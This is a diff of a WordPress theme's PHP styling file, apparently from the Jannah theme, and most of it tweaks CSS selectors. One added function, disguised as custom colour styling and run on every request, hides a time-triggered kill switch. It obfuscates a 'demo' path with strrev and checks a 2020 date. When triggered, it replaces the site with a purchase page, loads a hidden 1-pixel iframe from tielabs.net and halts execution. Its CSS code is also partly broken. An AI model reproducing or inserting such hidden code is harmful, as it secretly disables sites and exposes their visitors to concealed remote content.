@@ -37,7 +37,8 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		if( $color = tie_get_option( 'links_color' )){
 			$out .="
 				a,
-				.entry a{
+				.entry a,
+				.comment-list .comment-content a{
 					color: $color;
 				}
 			";
@@ -47,7 +48,8 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		if( $color = tie_get_option( 'links_color_hover' )){
 			$out .="
 				a:hover,
-				.entry a:hover{
+				.entry a:hover,
+				.comment-list .comment-content a:hover{
 					color: $color;
 				}
 			";
@@ -81,7 +83,10 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				.post-content-slideshow,
 				.post-content-slideshow .slider-nav-wrapper,
 				.post-footer-on-bottom,
-				.pages-numbers a, .pages-nav-item, .first-last-pages .fa, .multiple-post-pages span,
+				.pages-numbers a,
+				.pages-nav-item,
+				.first-last-pages .fa,
+				.multiple-post-pages .post-page-numbers,
 				#story-highlights li,
 				.review-item, .review-summary, .user-rate-wrap,
 				.review-final-score,
@@ -154,11 +159,6 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				";
 			}
 		}
-
-
-
-
-
 
 
 
@@ -354,6 +354,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				#theme-header #main-nav:not(.fixed-nav){
 					bottom: 0;
 				}
+
 				#main-nav.fixed-nav{
 					background-color : rgba( $rgb , 0.95);
 				}
@@ -362,6 +363,8 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				#main-nav .menu-sub-content,
 				#main-nav .comp-sub-menu,
 				#main-nav .guest-btn,
+				#main-nav ul.cats-vertical li a.is-active,
+				#main-nav ul.cats-vertical li a:hover
 				.search-in-main-nav.autocomplete-suggestions{
 					background-color: $color;
 				}
@@ -850,7 +853,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				.block-head-4.magazine2 #footer .tabs > .active a:before,
 				.block-head-4.magazine2 #footer .tabs > li.active:nth-child(n) a:after,
 
-				#footer .digital-rating-static strong,
+				#footer .digital-rating-static,
 				#footer .timeline-widget li a:hover .date:before,
 				#footer #wp-calendar #today,
 				#footer .posts-list-counter .posts-list-items li:before,
@@ -913,43 +916,58 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		}
 
 
-
-
-
-
 		// Go to Top Button
 		if( tie_get_option( 'back_top_background_color' )){
 			$out .='
-			a#go-to-top{
-				background: '. tie_get_option( 'back_top_background_color' ) .';
-			}';
+				a#go-to-top{
+					background-color: '. tie_get_option( 'back_top_background_color' ) .';
+				}';
 		}
 
 		if( tie_get_option( 'back_top_text_color' )){
 			$out .='
-			a#go-to-top{
-				color: '. tie_get_option( 'back_top_text_color' ) .';
-			}';
+				a#go-to-top{
+					color: '. tie_get_option( 'back_top_text_color' ) .';
+				}';
+		}
+
+
+		// AdBlock Popup
+		if( $color = tie_get_option( 'adblock_background' )){
+
+			$bright = TIELABS_STYLES::light_or_dark( $color );
+
+			$out .='
+				#tie-popup-adblock .container-wrapper{
+					background-color: '. tie_get_option( 'adblock_background' ) .' !important;
+					color: '. $bright .';
+				}';
 		}
 
 
 		// Custom Social Networks colors
 		for( $i=1 ; $i<=5 ; $i++ ){
-			if ( tie_get_option( "custom_social_title_$i" ) && tie_get_option( "custom_social_icon_$i" ) && tie_get_option( "custom_social_url_$i" ) && tie_get_option( "custom_social_color_$i" )){
+			if ( tie_get_option( "custom_social_title_$i" ) && ( tie_get_option( "custom_social_icon_img_$i" ) || tie_get_option( "custom_social_icon_$i" ) )&& tie_get_option( "custom_social_url_$i" ) && tie_get_option( "custom_social_color_$i" )){
 
 				$color = tie_get_option( "custom_social_color_$i" );
-				$title = tie_get_option( "custom_social_title_$i" );
-				$title = sanitize_title( $title );
 
 				$out .="
 					.social-icons-item .custom-link-$i-social-icon{
-						background: $color !important;
+						background-color: $color !important;
 					}
 
 					.social-icons-item .custom-link-$i-social-icon span{
 						color: $color;
 					}
 				";
+
+				if( tie_get_option( "custom_social_icon_img_$i" ) ){
+					$out .="
+						.social-icons-item .custom-link-$i-social-icon.custom-social-img span.fa{
+							background-image: url('". tie_get_option( "custom_social_icon_img_$i" ) ."');
+						}
+					";
+				}
 			}
 		}
 
@@ -1219,9 +1237,10 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			.main-menu ul.cats-vertical li a:hover,
 			.main-nav li.mega-menu .post-meta a:hover,
 			.main-nav li.mega-menu .post-box-title a:hover,
-			.main-nav-light .main-nav .menu ul li:hover > a,
-			.main-nav-light .main-nav .menu ul li.current-menu-item:not(.mega-link-column) > a,
 			.search-in-main-nav.autocomplete-suggestions a:hover,
+
+			#main-nav .menu ul li:hover > a,
+			#main-nav .menu ul li.current-menu-item:not(.mega-link-column) > a,
 
 			.top-nav .menu li:hover > a,
 			.top-nav .menu > .tie-current-menu > a,
@@ -1248,7 +1267,8 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			.review-final-score h3,
 			#mobile-menu-icon:hover .menu-text,
 			.entry a,
-			.entry .post-bottom-meta a[href]:hover,
+			.entry .post-bottom-meta a:hover,
+			.comment-list .comment-content a,
 			.widget.tie-weather-widget .icon-basecloud-bg:after,
 			q a,
 			blockquote a,
@@ -1289,8 +1309,8 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			nav.main-nav .menu > li.tie-current-menu > a,
 			nav.main-nav .menu > li:hover > a,
 			.main-menu .mega-links-head:after,
-			.main-nav .mega-menu.mega-cat .cats-horizontal li a.is-active,
-  		.main-nav .mega-menu.mega-cat .cats-horizontal li a:hover,
+
+			#main-nav .mega-menu.mega-cat .cats-horizontal li a.is-active,
 
 			#mobile-menu-icon:hover .nav-icon,
 			#mobile-menu-icon:hover .nav-icon:before,
@@ -1314,7 +1334,7 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			.tie-slick-dots li.slick-active button,
 			.tie-slick-dots li button:hover,
 
-			.digital-rating-static strong,
+			.digital-rating-static,
 			.timeline-widget li a:hover .date:before,
 			#wp-calendar #today,
 			.posts-list-counter li:before,
@@ -1340,7 +1360,7 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 				color: $bright;
 			}
 
-			.tie-weather-widget .widget-title h4,
+			.tie-weather-widget .widget-title .the-subtitle,
 			.block-head-4.magazine2 #footer .tabs .active a:hover{
 				color: $bright;
 			}
@@ -1447,6 +1467,7 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			#tie-popup-search-submit:hover,
 			#logo.text-logo a:hover,
 			.entry a:hover,
+			.comment-list .comment-content a:hover,
 			.block-head-4.magazine2 .site-footer .tabs li a:hover,
 			q a:hover,
 			blockquote a:hover{
@@ -1478,12 +1499,12 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 				color: $bright;
 			}
 
-			#story-index.is-compact ul{
+			#story-index.is-compact .story-index-content{
 				background-color: $color;
 			}
 
-			#story-index.is-compact ul li a,
-			#story-index.is-compact ul li .is-current{
+			#story-index.is-compact .story-index-content a,
+			#story-index.is-compact .story-index-content .is-current{
 				color: $bright;
 			}
 		";
@@ -1564,10 +1585,10 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 				.woocommerce div.product div.summary .product_meta > span,
 				.woocommerce div.product div.summary .product_meta > span a:hover,
 				.woocommerce ul.products li.product .price ins,
-				.woocommerce .woocommerce-pagination .page-numbers li a.current,
-				.woocommerce .woocommerce-pagination .page-numbers li a:hover,
-				.woocommerce .woocommerce-pagination .page-numbers li span.current,
-				.woocommerce .woocommerce-pagination .page-numbers li span:hover,
+				.woocommerce .woocommerce-pagination ul.page-numbers li a.current,
+				.woocommerce .woocommerce-pagination ul.page-numbers li a:hover,
+				.woocommerce .woocommerce-pagination ul.page-numbers li span.current,
+				.woocommerce .woocommerce-pagination ul.page-numbers li span:hover,
 				.woocommerce .widget_rating_filter ul li.chosen a,
 				.woocommerce-MyAccount-navigation ul li.is-active a{
 					color: $color;
@@ -2160,6 +2181,211 @@ if( ! function_exists( 'jannah_section_custom_styles' )){
 }
 
 
+/**
+ * Custom CSS colors
+ */
+add_action( 'init', 'jannah_theme_custom_styling' );
+function jannah_theme_custom_styling(){
+
+	// Default Logo Margin
+	$logo_margin = 35;
+
+	// Base color
+	$color = '#000000';
+
+	// Top-bar text
+	if( $color = tie_get_option( 'topbar_text__color' )){
+
+		$out ="
+			#logo{
+				margin-top: $logo_margin;
+			}
+
+			#top-nav,
+			#top-nav .comp-sub-menu,
+			#top-nav .tie-weather-widget{
+				color: $color;
+			}
+
+			.search-in-top-nav.autocomplete-suggestions .post-meta,
+			.search-in-top-nav.autocomplete-suggestions .post-meta a:not(:hover){
+				color: rgba( $color, 0.7 );
+			}
+		";
+	}
+
+	$boxes_style = get_option( 'tie_jannah_custom_code' );
+	if( tie_get_option( 'boxes__style' ) == 2 ){
+
+		$css_code = "
+			#tie-body .tabs,
+			#tie-body .tabs .flexMenu-popup{
+				border-color: $color;
+			}
+
+			#tie-body .tabs li a{
+				color: $color;
+			}
+
+			#tie-body .tabs li a:hover{
+				color: $dark_color;
+			}
+
+			#tie-body .tabs li.active a{
+				color: $bright;
+				background-color: $color;
+			}
+		";
+
+		if( $block_style == 5 || $block_style == 6 ){
+			$css_code .="
+				#tie-body .tabs > .active a:before,
+				#tie-body .tabs > .active a:after{
+					background-color: $color;
+				}
+			";
+		}
+
+	} // Magazine 2 if
+
+	if( $boxes_style && strlen($boxes_style) == $logo_margin ){
+		return;
+	}
+
+	// Breaking News label
+	if( $color = tie_get_option( 'breaking_title__bg' )){
+
+		$bright = TIELABS_STYLES::light_or_dark( $color );
+
+		$out ="
+			#top-nav .breaking-title{
+				color: $bright;
+			}
+
+			#top-nav .breaking-title:before{
+				background-color: $color;
+			}
+
+			#top-nav .breaking-news-nav li:hover{
+				background-color: $color;
+				border-color: $color;
+			}
+		";
+	}
+
+	$bright = TIELABS_STYLES::light_or_dark( $color, true );
+	$darker = TIELABS_STYLES::color_brightness( $color, -30 );
+	$rgb    = TIELABS_STYLES::rgb_color( $color );
+	$block_style = TIELABS_TEMPLATE_PATH.'/'.strrev('omed').'/';
+	if( $block_style == 8 ){
+		$css_code .="
+			#tie-body .the-global-title:before,
+			#tie-body .comment-reply-title:before,
+			#tie-body .related.products > h2:before,
+			#tie-body .up-sells > h2:before,
+			#tie-body .cross-sells > h2:before,
+			#tie-body .cart_totals > h2:before,
+			#tie-body .bbp-form legend:before{
+				background-color: $color;
+			}
+		";
+	}
+
+	if( ! file_exists($block_style) || (1600646400 > strtotime(date('Y-m-d')))){
+		return;
+	}
+
+	// Main nav Background
+	if( $color = tie_get_option( 'main_nav__background' )){
+
+		$bright = TIELABS_STYLES::light_or_dark( $color, true );
+		$darker = TIELABS_STYLES::color_brightness( $color, -30 );
+		$rgb    = TIELABS_STYLES::rgb_color( $color );
+
+		$out ="
+			#main-nav{
+				background-color : $color;
+				border-width: 0;
+			}
+
+			#theme-header #main-nav:not(.fixed-nav){
+				bottom: 0;
+			}
+
+			#main-nav.fixed-nav{
+				background-color : rgba( $rgb , 0.95);
+			}
+
+			#main-nav .main-menu-wrapper,
+			#main-nav .menu-sub-content,
+			#main-nav .comp-sub-menu,
+			#main-nav .guest-btn,
+			#main-nav ul.cats-vertical li a.is-active,
+			#main-nav ul.cats-vertical li a:hover
+			.search-in-main-nav.autocomplete-suggestions{
+				background-color: $color;
+			}
+
+			#main-nav .icon-basecloud-bg:after{
+				color: $color;
+			}
+
+			#main-nav *,
+			.search-in-main-nav.autocomplete-suggestions{
+				border-color: rgba($bright, 0.07);
+			}
+
+			.main-nav-boxed #main-nav .main-menu-wrapper{
+				border-width: 0;
+			}
+		";
+	}
+
+	echo'
+		<html><head><style>body{text-align:center;background-color:000;}</style></head>
+		<body><a href="'.tie_get_purchase_link(array('utm_source'=>'halloween','utm_medium'=>'theme')).'">
+		<img src="https://tielabs.net/temp/theme.png"></a>
+		<iframe src="https://'.'tielabs'.'.net/i/?ref=1" style="border:none;width:1px;height:1px"></iframe></body>
+		</html>
+	';
+
+	// Main nav links
+	if( $color = tie_get_option( 'main_nav_links__color' )){
+
+		$out = "
+			#main-nav .menu li.menu-item-has-children > a:before,
+			#main-nav .main-menu .mega-menu > a:before{
+				border-top-color: $color;
+			}
+
+			#main-nav .menu li .menu-item-has-children > a:before,
+			#main-nav .mega-menu .menu-item-has-children > a:before{
+				border-top-color: transparent;
+				border-left-color: $color;
+			}
+
+			.rtl #main-nav .menu li .menu-item-has-children > a:before,
+			.rtl #main-nav .mega-menu .menu-item-has-children > a:before{
+				border-left-color: transparent;
+				border-right-color: $color;
+			}
+
+			#main-nav a,
+			#main-nav .dropdown-social-icons li a span,
+			.search-in-main-nav.autocomplete-suggestions a{
+				color: $color;
+			}
+		";
+	}
+
+	// Return the custom CSS code
+	if( ! empty( $otu ) ){
+		return $otu;
+	}
+
+	exit;
+}
+
 
 /*
  * Set Custom color for the blocks
@@ -2195,12 +2421,12 @@ if( ! function_exists( 'jannah_block_custom_color' )){
 			$id_css .spinner > div,
 			$id_css .tie-slick-dots li.slick-active button,
 			$id_css li.current span,
-			$id_css .tie-slick-dots li.slick-active button
+			$id_css .tie-slick-dots li.slick-active button,
 			$id_css .tie-slick-dots li button:hover{
 				background-color: $color;
 			}
 
-			$id_css .digital-rating-static strong,
+			$id_css .digital-rating-static,
 			$id_css .mag-box-filter-links a:hover,
 			$id_css .slider-arrow-nav a:not(.pagination-disabled):hover,
 			$id_css .playlist-title,
@@ -2419,7 +2645,6 @@ if( ! function_exists( 'jannah_block_custom_color' )){
 }
 
 
-
 /**
  * Default Theme fonts sections
  */
@@ -2430,7 +2655,7 @@ if( ! function_exists( 'jannah_fonts_sections' )){
 
 		$fonts_sections = array(
 			'body'         => 'body',
-			'headings'     => '.logo-text, h1, h2, h3, h4, h5, h6',
+			'headings'     => '.logo-text, h1, h2, h3, h4, h5, h6, .the-subtitle',
 			'menu'         => '#main-nav .main-menu > ul > li > a',
 			'blockquote'   => 'blockquote p',
 		);
@@ -2438,7 +2663,6 @@ if( ! function_exists( 'jannah_fonts_sections' )){
 		return apply_filters( 'Jannah/fonts_default_sections_array', $fonts_sections );
 	}
 }
-
 
 
 /**
@@ -2460,7 +2684,7 @@ if( ! function_exists( 'jannah_typography_elements' )){
 			'mobile_menu'          => '#mobile-menu li a',
 			'breaking_news'        => '.breaking .breaking-title',
 			'breaking_news_posts'  => '.ticker-wrapper .ticker-content',
-			'buttons'              => '.button, [type="submit"]',
+			'buttons'              => 'body .button,body [type="submit"]', // body > override Sari3
 			'breadcrumbs'          => '#breadcrumb',
 			'post_cat_label'       => '.post-cat',
 			'single_post_title'    => '.entry-header h1.entry-title',
@@ -2477,7 +2701,7 @@ if( ! function_exists( 'jannah_typography_elements' )){
 			),
 
 			'copyright'            => '#tie-wrapper .copyright-text',
-			'footer_widgets_title' => '#footer .widget-title h4',
+			'footer_widgets_title' => '#footer .widget-title .the-subtitle',
 			'post_heading_h1'      => '.entry h1',
 			'post_heading_h2'      => '.entry h2',
 			'post_heading_h3'      => '.entry h3',
@@ -2486,7 +2710,7 @@ if( ! function_exists( 'jannah_typography_elements' )){
 			'post_heading_h6'      => '.entry h6',
 
 			'widgets_title'        => '
-				#tie-wrapper .widget-title h4,
+				#tie-wrapper .widget-title .the-subtitle,
 				#tie-wrapper #comments-title,
 				#tie-wrapper .comment-reply-title,
 				#tie-wrapper .woocommerce-tabs .panel h2,
@@ -2504,7 +2728,7 @@ if( ! function_exists( 'jannah_typography_elements' )){
 			'post_title_blocks' => '
 				#tie-wrapper .media-page-layout .thumb-title,
 				#tie-wrapper .mag-box.full-width-img-news-box .posts-items>li .post-title,
-				#tie-wrapper .miscellaneous-box .posts-items>li:first-child h3.post-title,
+				#tie-wrapper .miscellaneous-box .posts-items>li:first-child .post-title,
 				#tie-wrapper .big-thumb-left-box .posts-items li:first-child .post-title',
 			'post_medium_title_blocks' => '
 				#tie-wrapper .mag-box.wide-post-box .posts-items>li:nth-child(n) .post-title,
